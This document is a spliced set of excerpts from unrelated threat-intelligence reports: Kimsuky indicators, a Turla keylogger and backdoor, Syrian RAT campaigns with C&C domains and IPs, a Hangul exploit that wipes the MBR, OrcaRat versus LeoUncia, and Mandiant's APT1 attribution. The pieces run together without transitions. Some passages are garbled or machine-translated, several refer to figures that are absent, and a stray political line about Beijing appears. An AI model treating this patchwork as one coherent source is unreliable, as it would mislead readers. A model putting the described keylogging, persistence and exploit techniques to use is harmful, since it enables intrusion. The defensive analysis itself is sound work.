Files used by malware : % windir % system32kbdlv2.dll % windir % system32auto.dll % windir % system32netsvcs.exe % windir % system32netsvcs_ko.dll % windir % system32vcmon.exe % windir % system32svcsmon.exe % windir % system32svcsmon_ko.dll % windir % system32wsmss.exe % temp % ~DFE8B437DD7C417A6D.TMP % temp % ~DFE8B43.TMP % temp % ~tmp.dll C : Windowstaskmgr.exe C : Windowssetup.log C : Windowswinlog.txt C : Windowsupdate.log C : Windowswmdns.log C : Windowsoledvbs.inc C : Windowsweoig.log C : Windowsdata.dat C : Windowssys.log C : WindowsPcMon.exe C : WindowsGoogle Update.exe C : WindowsReadMe.log C : Windowsmsdatt.bat C : Windowsmsdatl3.inc C : Program FilesCommon FilesSystemOle DBmsdmeng.cnt C : Program FilesCommon FilesSystemOle DBxmlrwbin.inc C : Program FilesCommon FilesSystemOle DBmsdapml.cnt C : Program FilesCommon FilesSystemOle DBsqlsoldb.exe C : Program FilesCommon FilesSystemOle DBoledjvs.inc C : Program FilesCommon FilesSystemOle DBoledvbs.inc C : Program FilesCommon FilesSystemOle DBmsolui80.inc C : Program FilesCommon FilesSystemOle DBmsdaipp.cnt C : Program FilesCommon FilesSystemOle DBmsdaerr.cnt C : Program FilesCommon FilesSystemOle DBsqlxmlx.inc < Hangul full path > HncReporter.exe Related MD5 : 3baaf1a873304d2d607dbedf47d3e2b4 3195202066f026de3abfe2f966c9b304 4839370628678f0afe3e6875af010839 173c1528dc6364c44e887a6c9bd3e07c 191d2da5da0e37a3bb3cbca830a405ff 5eef25dc875cfcb441b993f7de8c9805 b20c5db37bda0db8eb1af8fc6e51e703 face9e96058d8fe9750d26dd1dd35876 9f7faf77b1a2918ddf6b1ef344ae199d d0af6b8bdc4766d1393722d2e67a657b 45448a53ec3db51818f57396be41f34f 80cba157c1cd8ea205007ce7b64e0c2a f68fa3d8886ef77e623e5d94e7db7e6c 4a1ac739cd2ca21ad656eaade01a3182 4ea3958f941de606a1ffc527eec6963f 637e0c6d18b4238ca3f85bcaec191291 b3caca978b75badffd965a88e08246b0 dbedadc1663abff34ea4bdc3a4e03f70 3ae894917b1d8e4833688571a0573de4 8a85bd84c4d779bf62ff257d1d5ab88b d94f7a8e6b5d7fc239690a7e65ec1778 f1389f2151dc35f05901aba4e5e473c7 96280f3f9fd8bdbe60a23fa621b85ab6 f25c6f40340fcde742018012ea9451e0 122c523a383034a5baef2362cad53d57 2173bbaea113e0c01722ff8bc2950b28 2a0b18fa0887bb014a344dc336ccdc8c ffad0446f46d985660ce1337c9d5eaa2 81b484d3c5c347dc94e611bae3a636a3 ab73b1395938c48d62b7eeb5c9f3409d 69930320259ea525844d910a58285e15 Names of services created by malware : DriverManage WebService WebClientManager Remote Access Service We detect these threats as Trojan . Win32.Kimsuky except modified Team Viewer client components which are detected as Trojan . Win32.Patched.ps .
File name : varies MD5 : a3cbf6179d437909eb532b7319b3dafe Compilation timestamp : 2012.10.02 10:51:50 ( GMT ) Compiler : Microsoft Visual Studio 2010 File format : PE32 DLL Exports : _ LowLevelKeyboardProc @ 12 Creates the log file : % TEMP % \~DFD3O8.tmp .
If failed , tries to write to the file f : \keyhook.log Each time the keylogger starts , it appends the following header to the log file : -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- New Session : % fully qualified computer name % % timestamp % -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- It then creates a hidden console window and registers its only export _ LowLevelKeyboardProc @ 12 as a hook procedure for low - level keyboard input events ( WH_KEYBOARD_LL hook ) .
Depending on the results , it writes a line to its log file .
In case the hook was installed , the line is '' Started ...
It also starts a thread that retrieves the current foreground window handle every 100 milliseconds .
This handle is then used in the keyboard hook procedure .
The low - level keyboard hook procedure intercepts WM_KEYDOWN , WM_KEYUP and WM _ SYSKEYDOWN system messages and writes information about each keystroke to the log file .
Every time a new window becomes active , it retrieves its name and the path to its application and writes this information to the log file : [ % path to the application 's executable file % : `` % window title % '' ] Analyzed file ( others are similar ) : Compilation timestamp : 2013.10.15 10:43:09 ( GMT ) File format : PE32 DLL , modified ( the file is supposed to be started by a custom loader ) Exports : The main functionality is implemented in a single function that is called by the DllMain entry point .
The exported functions allow to call the same function directly ( exported as `` start '' ) or to start / stop it in a separate thread ( `` ModuleStart '' / '' ModuleStop '' ) and with slightly different parameters .
This indicates the backdoor can also function as a plugin for the Turla Carbon system .
The main function executes in an infinite loop .
It collects most of the available information about the system , transmits it to the C & C server and executes the commands it receives back .
The module delays execution for random periods while it discovers running processes with one of the following filenames : The following system information is collected : The retrieved information is compressed using bzip2 , encrypted with AES and then encoded using Base64 before being transmitted to the C & C server .
When there is a file waiting for upload ( usually , this is file that contains the results of the previously received and executed command ) , it is read from disk and uploaded to the server instead of the system information .
The C & C communication is implemented on top of the standard HTTP / HTTPS protocols .
The list of the C & C URLs is hardcoded in the binary but may be overridden by further commands .
The module uses Wininet API functions for issuing HTTP POST requests to the server .
The module transmits the collected information in the body of the POST request and gets new commands from the server 's response .
The request body can be empty if there is no new information to upload .
The response is usually an HTML document and the commands are Base64-encoded strings enclosed in < div > / < /div > tags .
Every command is encrypted using asymmetric encryption with temporary AES session keys .
Each command is a mixed text / binary buffer .
It consists of two parts : payload and configuration .
The configuration is an INI file that controls the further behavior of the module .
It is extracted into a temporary file named % TEMP % \~D % random % .tmp
The payload , if exists , is supposed to be an executable file and may be executed if there is a corresponding command present in the INI part .
The Global Research and Analysis Team ( GReAT ) at Kaspersky Lab has discovered new malware attacks in Syria , with malicious entities using a plethora of methods from their toolbox to hide and operate malware .
In addition to proficient social engineering tricks , victims are often tempted to open and explore malicious files because of the dire need for privacy and security tools in the region .
In the hopes of maintaining anonymity and installing the latest `` protection '' , victims fall prey to these malicious creations .
A vast majority of the samples obtained were found on activist sites and in social networking forums .
The victims are distributed across different countries : • Syria • Lebanon • Turkey • Kingdom of Saudi Arabia • Egypt • Jordan • Palestine • United Arab Emirates • Israel • Morocco • United States The group members are operating from different locations around the world : • Syria • Russian Federation • Lebanon The group 's attacks are evolving and they are making extensive use of social engineering techniques to trick targeted victims into running their malicious files .
Among the principal file extensions observed among the malware samples obtained we can list : • .exe
The group is relying on RAT ( Remote Access Tool ) Trojan tools , of which the most common are : • ShadowTech RAT • Xtreme RAT • NjRAT • Bitcomet RAT • Dark Comet RAT • Blackshades RAT The number of malicious files found is 110 , with a big increase seen in recent attacks .
The number of domains linked to the attacks is 20 .
The number of IP addresses linked to the attacks is 47 .
The samples details and domains lists used by the attackers can be found in the Appendices 1 and 2 in the end of the document .
Protection and resilience against these attacks is ensured through the use of a multi - layered security approach , having up to date security products , and mainly by being sceptical about suspicious files .
The geopolitical conflicts in the Middle East have deepened in the last few years ; Syria is no exception .
The crisis is taking many forms , and the cyberspace conflict is intensifying as sides try to tilt the struggle , by exploiting cyber intelligence and exercising distortion .
In the last few years cyber - attacks in Syria have moved into the front line ; many activities in cyberspace have been linked to Syria , especially those conducted by the Syrian Electronic Army and pro - government groups .
The Global Research and Analysis Team ( GReAT ) at Kaspersky Lab has found new malware attacks in Syria , using new but not advanced techniques to hide and operate malware , in addition to using proficient social engineering tricks to deliver malware by tricking and tempting victims into opening and exploring malicious files .
The malware files have been found on hacked activist sites , web pages and in social networking forums .
Cyber Arabs , an Arabic - language digital security project of the IWPR ( Institute for War and Peace Reporting ) , reported four of these samples in March 2014 .
The same samples were also reported on Syrian Facebook pages ( ‫تقنيون ألجل الحرية‬ , Technicians For Freedom ) : https : //www.facebook.com/ tech4freedom Given the complexity of the situation , there are many factors and entities at play in this event , but from the outside these are all largely speculative .
Pro - government groups talk about `` defense '' and opposition activists talk about `` offense '' .
Here , we will only focus on the malware and the facts that have been found during the analysis , presenting only relevant information , in the hope of setting a clear context for this research .
Malware writers are using multiple techniques to deliver their files and entice the victims to run them , creating an effective infection vector .
Mainly depending on social engineering the attackers exploit : • Victims ' trust in social networking forums • Victims ' curiosity in following news related to political conflict in Syria • Victims ' fear of attacks from government • Victims ' lack of technology awareness Once they have infected the victim 's computer , attackers have full access and control over victim 's devices .
In the following section we show different versions of posts sent via popular file sharing sites or social networking platforms .
The sample details and domain lists used by the attackers can be found in the Appendices 1 and 2 in the end of the document .
Messages sent via Skype offer links to download : 1 .
The `` SSH VPN '' program to encrypt communication 2 .
The popular and effective antivirus with daily updates from `` Ammazon Internet Security '' 3 .
The `` SmartFirewall '' to block connections made by malware and bad programs The messages are usually sent from fake or compromised accounts .
The same messages sent via Skype are also shared via the Facebook social platform , asking victims to install these `` security programs '' to protect themselves from malware infections and cyber - attacks , especially government attacks .
In the following example , we can see a YouTube video providing links to download fake Whatsapp and Viber applications for PC .
By using everyday technologies that are commonly used by a broad audience , attackers increase the effectiveness of their operations and their infection rates .
Analysis has led us to identify the following RAT variants being used in the wild : • ShadowTech RAT • Xtreme RAT • NjRAT • Bitcomet RAT • Dark Comet RAT • BlackShades RAT The samples collected during our research can be classified as follows .
Old samples Samples obtained during 2013 are simple RAT executable files , compressed and sent to victims using a wide range of delivery options .
Newer samples were typically found to use `` .scr
New samples More recent samples , starting from the end of 2013 , have shown a more organized development effort , creating highly stealth and graphically - enticing applications .
In this analysis we have seen how Syrian malware has evolved , showing no signs of stopping any time soon .
Even though new malicious Syrian samples are appearing each day , the subset presented here will hopefully give the reader an overall view of the techniques and tools that are currently being used to target Syrian citizens .
Curiosity killed the cat : browsing a previously leaked spreadsheet of wanted activists leads to infection .
We found a set of compressed files on a popular social networking site ; when , extracted it showed a database containing a list of activists and wanted individuals in Syria .
A video entitled '' ‫ `` إختراق أجهزة الكمبيوتر الخاصة بالمجرم علي مملوك وباقي عصابة االسد‬was published on November 9 2013 , and the download link for this database application was included in the information section of the video .
The download URL redirected victims to a file - sharing service where the file was being hosted .
The compressed RAR file `` ‫برنامج االٔمن الوطني‬.rar '' , with the MD5 signature 0c711bf29815aecc65016712981 59a74 and a file - size of 7,921,063 bytes was protected with the password `` 111222333 '' .
The video requests the victim to scan the password protected `` .rar
After extracting all the files to a temporary folder , we were presented with the application itself and a text file needed to access the `` hidden '' features of the program .
The file `` PASSWORD.txt file '' contained the following text : syria123 ! @ # ‫ال تبخلوا علينا بالدعاء قراصنة جبهة النصرة‬ Upon closer inspection , the first and last buttons of the application were functional , but the others generated error messages ( claiming that some files were missing ) .
The first button ( ‫فيش عام شامل‬ , General Global File ) uses `` data-base.db.exe '' ( MD5 8f16efb51fe67961e e31c4f36cbe11db ) , which was placed into `` C : \Users\User\AppData\Roaming '' and , when executed , extracts the Excel spreadsheet file `` Data - Base.xslx '' ( MD5 f0a8a1556efbb106b6297700d4cce61b ) from the `` Data - Base.db '' ( MD5 95a5c3e91bbb4a3a323433841fbef82a ) file in the main folder .
The last button ( ‫ ) إنهاء الب رنامج‬is the exit button .
Here is some interesting information worth noting : • `` ‫ب رنامج االٔمن الوطني‬.exe '' is not detected as a malicious file .
The file `` data-base.db '' is a compressed archive : • Product name from the file signature : Project1 • Publisher name from the signature : Syrian malware • Compilation Timestamp : 2013 - 11 - 09 14:47:26 When system32.exe is run , the process `` iexplorer.exe '' is spawned and is automatically registered for Startup .
The file connects to the IP address 31.9.48.7 TCP on port 999 .
As mentioned in previous reports , the IP address 31.9.48.7 belongs to the Syrian Telecommunications Establishment ( STE ) .
Other temporary files used for the infection were also detected , such as `` system32.exe '' ( MD5 : 9424b355a3670fd7749d3d25cbea18cb ) which was copied into the `` C : \Users\user\appdata\ local\temp\ '' folder .
The presence of DarkComet 's `` DC_MUTEX- * '' was a giveaway of the usage of this remote administration tool .
During infection , the Excel spreadsheet is displayed , comprising 96763 rows and 13 columns of activist information .
The rows correspond to records of individuals wanted by the government and the columns correspond to information about the individuals .
While there is no column description , data in each column reflects the type of data .
A disturbing video showing injured victims of recent bombings was used to appeal to people 's fear and exert them to download a malicious application available in a public file - sharing website .
After our initial analysis , the file named `` ‫فضائح‬.exe '' proved to be heavily obfuscated with the commercial utility `` MaxToCode '' for .NET
When executed , the original sample created another executable file in the Windows ' temporary folder ( C : \Users\ [ USERNAME ] \AppData\Local\Temp ) named `` Trojan.exe '' , which corresponds to the code of the RAT itself .
This is used to save all keystrokes and system activity to another file in the same location , `` Trojan.exe.tmp '' .
Captured information is sent to a dynamic domain corresponding to the host `` hacars11.no-ip.biz '' , using local port 1177 with no SSL encryption ( but base64 encoded ) , making the analysis of the network traffic a much easier task .
During the initial connection to the remote server ( after an initial ping to check for internet connectivity ) , the Trojan will send the machine 's name , installed Windows version , logged username , webcam availability and the version of the RAT in use .
Several embedded command line scripts are in charge of adding the Trojan 's executable file to the Windows Firewall allowed list , while at the same time disabling security zone checking in Internet Explorer .
System persistence is obtained via a modification in the `` Software\Microsoft\Windows\ CurrentVersion\Run '' registry key and by adding a copy of the malware to the Startup folder .
Even though different obfuscation techniques are used in the samples we analysed , all of them have underlying dependencies on the .NET
If you thought the era of fake antivirus programs was over , here comes a newly developed sample to challenge your beliefs .
With the innocent title of `` Ammazon Internet Security '' , this malicious application tries to mimic a security scanner , even including a quite thorough graphical user interface and some interactive functionality .
Again , this shows the simplicity of creating a graphical user interface that will trick most of the non- tech - savvy population .
Using nothing more than a couple of buttons and a catchy name , Syrian malware groups were hoping that the intended victims would fall for the trap .
Analyzing the code interestingly revealed that it has the look -- feel of a security application ; but , of course , no real security features .
While silently executing a remote administration tool when launching this `` security suite '' , targeted victims were left without their `` Ammazon '' protection but witha RAT installed .
From the Windows process list shown in Process Explorer , we were able to see `` J. L Antivirus 4.0 '' executing in our system , and through Process Monitor we caught the creation of the `` analysis '' log file for our fake antivirus .
Behind the curtains , a connection is made to a remote host , sending real time information on all our activities - the real cost of this free internet security suite ! Among the many programming methods found inside the source code , we were even able to find a `` CheckForUpdates '' function ; and if you look closely enough you can even see `` Detection '' and '' Quarantine '' assemblies included in this application .
So , not only has a lot of work gone into creating this fake antivirus , the authors also followed good programming practices and implemented modules for each specific ( albeit fake ) functionality .
Maybe at a really quick first sight this could pose as a legitimate tool , but a deeper inspection reveals its true malicious nature .
The real log file was one where all keystrokes were recorded and later sent from the computer via a TCP connection .
Even though this type of keylogging functionality is nothing new , when we consider how these malicious applications are being used , and the control they give to the attackers , we can start to measure the importance of reporting these threats and providing protection from them .
Evidently , the malware authors did n't care much to provide an option to close the `` antivirus '' , and if you were to kill the process you would get a nice ' blue screen of death ' and an unexpected system reboot .
Surely , the fake application will load again once everything is back up , creating an interesting method for guaranteeing persistence .
Total Network Monitor ( which is a legitimate application ) was inside another sample we found , used with embedded malware for spying purposes .
Offering security applications to protect against surveillance is one of the many techniques used by malware writing groups to get victims who are in desperate need for privacy to execute these dubious programs .
An almost fully functional version of the `` Total Network Monitor '' utility is included .
What this modified version does not show is the remote connection made to a host where f system information is dumped .
The actual infection is performed when first clicking on the installer , which uses obfuscation to hide all malicious activity until the `` legitimate '' tool is completely installed .
As with other samples reviewed , system persistence is obtained by modifying Windows start - up registry keys .
Using names such as `` Desktop Manager '' increases the likelihood for this threat to go unnoticed .
However , the entry name `` empty '' or `` empty.exe '' should raise a red flag when auditing these keys .
As with other samples , social engineering does all of the heavy work .
Instant messaging applications for desktop operating systems have been used in the past to spread malware and it seems that Syrian malware authors have jumped on the bandwagon .
In contrast to the `` Ammazon Internet Security '' , these samples do n't contain any graphical user interface or even an error message that will tell the victim not to worry about their security .
Heading straight for system infection has proven successful for them , and using these popular application names gets the interest of a much larger audience .
The following screenshot shows how the application name , intended functionality and even the icon used , all work in conjunction to create a believable story for the victim .
And this is not a comprehensive list , by any means .
Framing and social engineering techniques are playing an essential role in all Syrian related malware threats and the trend suggests that the complexity of them will only keep on increasing .
Another attack uses social engineering tricks .
The sample 38e3bc8776915dbd2e55a4d90f85a872 , named `` Kimawi.exe '' and with JPG icon , is a RAT file bound to the picture `` Kimawi.jpg '' .
This picture is a previously leaked paper supposedly by the regime in Syria warning military units to prepare for chemical attacks from friendly units .
Different remote administration tools have been spotted in the wild ; most of them provide an extensive range of functionality to fully control infected systems .
These include : • Keylogging • Capturing screenshots and webcam control .
Another RAT widely used in the Arab world is NjRAT , which includes a list of commands ( see below ) that can be sent from the controller to the infected system .
The attackers are working on full power , and the number of attacks and malicious files being distributed is constantly increasing as they become more organized and proficient .
Below is the timeline distribution for malicious files distributed during 2013 - 2014 , based on the first time they were distributed or seen in public ( Skype , Facebook , file - sharing , email , etc . ) .
Below is the timeline distribution for the collected samples based on compilation time The samples details and domains list used by the attackers can be found in the Appendices 1 and 2 in the end of the document .
The group responsible for the attacks is using common techniques shared by many of the hacking groups around the world .
They benefit from dynamic domains that can be linked to their modem devices and configured with forward functionality to a public IP address assigned by the ISP .
By restarting their modems they obtain a new address , creating a dynamic infrastructure that can be easily managed .
Dynamic Update Clients ( DUC ) on their computer devices ( usually the same as the RAT server ) are in charge of having the dynamic domain provider update to the newly assigned address .
Since the end of 2013 , the group has extensively relied on a class C IP subnet , 31.9.48.0/24 , provided by TARASSUL ISP ( Syrian Telecommunications Establishment ) for its attacks .
We suspect this subnet has been allocated to the group , also an indication that they are now operational from a single location .
In early 2014 , the group moved to an IP address in Russia ( 31.8.47.7 ) , to launch multiple new attacks .
This domain is registered for the email aloshalaa @ gmail.com .
It served as a pro - regime website back in 2012 and is being used for the C & C of some of the RAT files .
The domain was registered to okpa1984 @ gmail.com from 2011 to 2013 .
Malware has also been seen connecting to xtr.all4syrian.com and vip.all4syrian.com .
The map below shows the attackers ' geograhical distribution based on the geolocation of the IP addresses used by the C & C servers : The distribution of victims is confined only to Syria , but also reaches nearby countries .
We have observed victims of the Syrian - based malware in : • Syria • Lebanon • Turkey • Kingdom of Saudi Arabia • Egypt • Jordan • Palestine • United Arab Emirates • Israel • Morocco • United States Below are snapshots taken from videos published by the attackers , showing their RAT control panel and list of victims .
This shows some of the victims located in different countries .
The sample details and domain lists used by the attackers can be found in Appendices 1 and 2 in the end of this document .
It is worth noting that we have seen evidence of activists trying to carry out Denial of Service attacks on the RAT domains and servers , in an effort to overwhelm their resources and cause their connections to timeout .
The post below shows a warning from activists about pro - government hacker attacks on Facebook pages , explaining how pro - government groups post links to Trojanized applications in order to infect users The activists announce in the post that they have spotted a C & C domain used by the Trojans and that they are attacking it to remove all hacked victims .
From many posts , forums and identification videos , it is clear that the group has an organized structure of teams working together , The names and positions outlined below were collected from posts on infiltrated forums or pages .
They are all either nicknames or incomplete names that do not enable full identification of the attackers .
The Resistant Syrian Electronic Army • Group 1 : Team Hacker and Assad Penetrations Unit • Group 2 : Anonymous Syria Al Assad Unit • Group 3 : Management of Electronic Monitoring and Central Tracking Unit Remote Administration Tool ( RAT ) Trojans are malicious programs that allow a remote `` operator '' to control a system as if he has physical access to that system .
Malicious RATs are widely used by different types of cybercriminals ( hacktivists , script - kiddies , and scammers ) and even in some state - sponsored attacks .
Some of the most popular RATs are detected by Kaspersky products as following : • Trojan . MSIL.Zapchast , also known as Njrat • Backdoor . Win32.Bifrose , also known as Bitfrose • Backdoor . Win32.Fynloski , also known as DarkComet • Backdoor . Win32.Xtreme , also known as Xtremrat The statistics below , extracted from the Kaspersky Security Network ( KSN ) , show the number of RAT infection attacks blocked by Kaspersky Lab products in the MENA ( Middle East North Africa ) region in the 2013 - 2014 period : Based on KSN world statistics , the MENA region has one of the highest numbers for RAT attacks , as shown below : • Algeria has the highest number of users facing NjRat infection for the 2013 - 2014 period and five countries from MENA are in the NjRat top 10 • Algeria has the highest number of users facing Xtreme RAT infection for the 2013 - 2014 period and four countries from MENA are in the Xtreme RAT top 10 .
Syrian malware has a strong reliance on social engineering and the active development of technologically complex malicious variants .
Nevertheless , most of them quickly reveal their true nature when inspected carefully ; and this is one of the main reasons for urging Syrian users to be extra vigilant about what they download and to implement a layered defense approach .
Antivirus software uses either signature or heuristic - based detection to identify malware .
On the one hand , signature detection searches for a unique sequence of bytes that is specific to a piece of malicious code .
On the other hand , heuristic detection identifies malware based on program behaviour .
In our research we were able to collect more than 100 malware samples used to attack Syrian citizens .
Although most of these samples are known , cybercriminals rely on a plethora of obfuscation tools and techniques in order to change the malware structure so as to bypass signature scanning and avoid antivirus detection .
This proves how critical heuristic technologies are when it comes to protecting against these types of attack .
By being able to identify variants of known malware types or even new malware families , Kaspersky Lab security products detected all the collected samples .
We expect these attacks to continue and evolve both in quality and quantity .
We expect the attackers to start using more advanced techniques to distribute their malware , using malicious documents or drive - by download exploits .
With enough funding and motivation they might also be able to get access to zero day vulnerabilities , which will make their attacks more effective and allow them to target more sensitive or high profile victims .
Even though the attackers depend mainly on using known RATs , their rapid improvement and application of obfuscation techniques , GUI development for fake applications , and code modification via automated builders , increase the probability that it wo n't be too long before they start writing their own Trojans to take advantage of customized infection capabilities and implement better security evasion .
Finally , having a comprehensive and up - to - date antivirus and firewall should be the first measure taken by any user that does any type of online activity , especially during these uncertain times when new cyber threats appear almost daily .
The list of sample files has been collected through the infection vectors detailed above ( Skype , Facebook , file - sharing , email , etc . ) .
The samples have been either generated using automated tools ( RAT server , obfuscation tools ) or developed and bound to RAT files , especially the new samples with graphical content .
The following is a list of domains and corresponding IP addresses used in the attacks .
Vulnerabilities recently received a file with the destruction and MBR destruction capabilities for major extension to the existing file in addition to the backdoor functionality that existed in Hangul document file is received attention is required .
December 9 , 2014 received the first vulnerability Hangul document files were used for both groups known vulnerabilities , patching does not work on the latest products .
Total of 9 document file has been received , and all of the same malicious file therein .
The following [ Figure 1 ] shows the contents of the registry key ' PcaSvcc ' items registered by the malware .
In [ Figure 2 ] shows a code section that compares the time information for determining a destruction inside MBR infection .
Malicious code stored in the internal `` 0x780D0C33 '' value and the operation to compare the time information through a specific operation of the system time obtained by the GetLocalTime function call can be seen that true .
Infection , ' A ' ~ ' Z ' , the same process is repeated for all the drives .
The following [ Figure 4 ] is overwritten with the contents of the MBR code , and has the ability to output the string during boot `` Who Am I ? '' .
The following [ Figure 5 ] After MBR infection , a screen visible to the user reboots .
Malicious code can destroy the functionality of a file having a particular extension in addition to destruction together also has functions for the MBR .
Destroy the target file identified to date are : Locate the files with the extension of the above ' A ' ~ ' Z ' drive changes and performs a process to fill a NULL value to 4096 bytes ( 4 K ) size .
Received nine vulnerabilities Hangul document and the contents hereof are both used the same vulnerability varies .
In [ Figure 6 ] shows the portion of the shell part and the operation code for generating a vulnerability .
The layout of paragraphs in Hangul document and vulnerability occurs in the course of processing the part that is responsible ( ' HWPTAG_PARA_LINE_SEG ' ) and , shellcode ( ShellCode ) and heap spray insert a paragraph of text for ( Heap Spray ) ( ' HWPTAG_PARA_TEXT ' ) is used was .
In addition , the vulnerability has been identified as Hangul document files are disseminated in the form of a person to e - mail attachments .
For unascertained sender or unresolved attachment , the procedure to ensure that there is no problem in security is required before execution .
The PWC - named malware OrcaRat is presented as a new piece of malware but looking at the URI used for C & C communication , it could be an updated version of a well- known and kind of old piece of malware : LeoUncia .
Let 's face it : It looks a lot like : What about it ? Could it be the same kind of things , huh ? Let 's dig a little deeper inside the code to check if it is just some sort of coincidence or if it is indeed the same code that is behind these two pieces of malware .
Actually : and to obtain Di ( the original data that gives us Ei once encrypted ) , we must perform the following operation : where master_key is `` OrcaKiller '' for the OrcaRat sample .
What can we find in LeoUncia that is to be found in OrcaRat too ? First , let 's have a look at the URI decryption routine .
Dealing with OrcaRat , we have seen the following algorithm : When we talk about LeoUncia , we can have a look at the blog posts made by FireEye back in December 2010 , especially the second one , where some assembly code has been screenshot from IDA without ever giving the name of the underlying algorithm : yes , it is RC4 ! Once decoded from Base64 , the binary data we obtain from the URI is comprised of two parts : the first 16 bytes are the decryption key , and the rest of the data is the information to be decrypted .
Putting back pieces together , we have the following algorithm for LeoUncia : The two samples both share a `` custom '' Base64 encoding with the use of RC4 ; nothing fabulous , but it is a start .
We dig further with the encoding algorithm : the so - called `` custom '' Base64 .
In both case , the first goal of the customization is to avoid the presence of some `` / '' in any encoded data , because it would break down the process of cutting the URI along with the `` / '' separator .
For LeoUncia , the Base64 being used is the Base64-URI that replaces `` + '' and `` / '' by `` .
Additionally , OrcaRat authors thought it would be great if the URI was a little less obviously Base64-related .
So , rather than splitting every eight characters to avoid having '' = '' in the URI , they decided that replacing the endings `` = '' in `` = 1 '' and `` = = '' in `` = 2 '' would be a great improvement .
Let 's have a look at one of the feature of LeoUncia : the hibernate feature .
The feature does the same in OrcaRat : check for some date and time written in a file , and sleep for as long as needed before deleting the aforementioned file .
Finally , let 's look at the debug strings we can find in the binaries .
The LeoUncia sample studied by FireEye includes a perfect English string : `` \r\nThe Remote Shell Execute : % s completed ! \r\n '' Unfortunately , we can not find this string in the OrcaRat sample .
Bad luck ...
But when we look at a more recent sample of LeoUncia , we have one with the above string and two other interesting strings : `` \r\nThe Remote Shell Execute : % s completed ! \r\n '' `` \r\nReturnTime Set Error ! \r\n '' `` \r\nReturnTime set success ! \r\n '' These two strings are linked to the writing in the hibernation file , and indicates to the C & C manager that its command either succeeded or failed .
That is very interesting because the OrcaRat sample is also using some very similar debug strings to notify its C & C about the hibernate command : `` \r\nSet return time error = % d ! \r\n '' `` \r\nSet return time success ! \r\n '' And yes , it is always easier to debug your code when you know the error code ; that 's an improvement ! These two families are most likely linked in the sense that OrcaRat is a nicely updated version of LeoUncia .
Beijing is waging a massive trade war on us all , and we should band together to pressure them to stop .
Combined , the United States and our allies in Europe and Asia have significant diplomatic and economic leverage over China , and we should use this to our advantage to put an end to this scourge .
The majority of these security breaches are attributed to advanced threat actors referred to as the `` Advanced Persistent Threat '' ( APT ) .
We first published details about the APT in our January 2010 M - Trends report .
As we stated in the report , our position was that `` The Chinese government may authorize this activity , but there 's no way to determine the extent of its involvement .
The details we have analyzed during hundreds of investigations convince us that the groups conducting these activities are based primarily in China and that the Chinese Government is aware of them .
Mandiant continues to track dozens of APT groups around the world ; however , this report is focused on the most prolific of these groups .
We refer to this group as `` APT1 '' and it is one of more than 20 APT groups with origins in China .
From our observations , it is one of the most prolific cyber espionage groups in terms of the sheer quantity of information stolen .
The scale and impact of APT1 's operations compelled us to write this report .
The activity we have directly observed likely represents only a small fraction of the cyber espionage that APT1 has conducted .
Though our visibility of APT1 's activities is incomplete , we have analyzed the group 's intrusions against nearly 150 victims over seven years .
From our unique vantage point responding to victims , we tracked APT1 back to four large networks in Shanghai , two of which are allocated directly to the Pudong New Area .
We uncovered a substantial amount of APT1 's attack infrastructure , command and control , and modus operandi ( tools , tactics , and procedures ) .
In an effort to underscore there are actual individuals behind the keyboard , Mandiant is revealing three personas we have attributed to APT1 .
These operators , like soldiers , may merely be following orders given to them by others .
Our analysis has led us to conclude that APT1 is likely government - sponsored and one of the most persistent of China 's cyber threat actors .
We believe that APT1 is able to wage such a long - running and extensive cyber espionage campaign in large part because it receives direct government support .
In seeking to identify the organization behind this activity , our research found that People 's Liberation Army ( PLA 's ) Unit 61398 is similar to APT1 in its mission , capabilities , and resources .
The central building in this compound is a 130,663 square foot facility that is 12 stories high and was built in early 2007 .
The longest time period APT1 maintained access to a victim 's network was 1,764 days , or four years and ten months .
The majority of these 849 unique IP addresses were registered to organizations in China ( 709 ) , followed by the U.S. ( 109 ) .
In over 97 % of the 1,905 times Mandiant observed APT1 intruders connecting to their attack infrastructure , APT1 used IP addresses registered in Shanghai and systems set to use the Simplified Chinese language .
Microsoft 's Remote Desktop client configures this setting automatically based on the selected language on the client system .
Therefore , the APT1 attackers likely have their Microsoft® operating system configured to display Simplified Chinese fonts .
Of the 614 distinct IP addresses used for HTRAN communications : −− 614 of 614 ( 100 % ) were registered in China .
The size of APT1 's infrastructure implies a large organization with at least dozens , but potentially hundreds of human operators .
In an effort to underscore that there are actual individuals behind the keyboard , Mandiant is revealing three personas that are associated with APT1 activity .
His activities include registering domains attributed to APT1 and authoring malware used in APT1 campaigns .
Mandiant is releasing more than 3,000 indicators to bolster defenses against APT1 operations .
Redline can be downloaded at http : //www.mandiant.com/ resources / download / redline .
The sheer scale and duration of sustained attacks against such a wide set of industries from a singularly identified group based in China leaves little doubt about the organization behind APT1 .
We believe the totality of the evidence we provide in this document bolsters the claim that APT1 is Unit 61398 .
However , we admit there is one other unlikely possibility : A secret , resourced organization full of mainland Chinese speakers with direct access to Shanghai - based telecommunications infrastructure is engaged in a multi - year , enterprise scale computer espionage campaign right outside of Unit 61398 's gates , performing tasks similar to Unit 61398 's known mission .
The decision to publish a significant part of our intelligence about Unit 61398 was a painstaking one .
What started as a `` what if '' discussion about our traditional non - disclosure policy quickly turned into the realization that the positive impact resulting from our decision to expose APT1 outweighed the risk to our ability to collect intelligence on this particular APT group .
It is time to acknowledge the threat is originating in China , and we wanted to do our part to arm and prepare security professionals to combat that threat effectively .
The issue of attribution has always been a missing link in publicly understanding the landscape of APT cyber espionage .
Without establishing a solid connection to China , there will always be room for observers to dismiss APT actions as uncoordinated , solely criminal in nature , or peripheral to larger national security and global economic concerns .
We hope that this report will lead to increased understanding and coordinated action in countering APT network breaches .
At the same time , there are downsides to publishing all of this information publicly .
Many of the techniques and technologies described in this report are vastly more effective when attackers are not aware of them .
Additionally , publishing certain kinds of indicators dramatically shortens their lifespan .
When Unit 61398 changes their techniques after reading this report , they will undoubtedly force us to work harder to continue tracking them with such accuracy .
It is our sincere hope , however , that this report can temporarily increase the costs of Unit 61398 's operations and impede their progress in a meaningful way .
We are acutely aware of the risk this report poses for us .
We expect reprisals from China as well as an onslaught of criticism .
Our research and observations indicate that the Communist Party of China ( CPC , 中国共产党 ) is tasking the Chinese People 's Liberation Army ( PLA , 中国人民解放军 ) to commit systematic cyber espionage and data theft against organizations around the world .
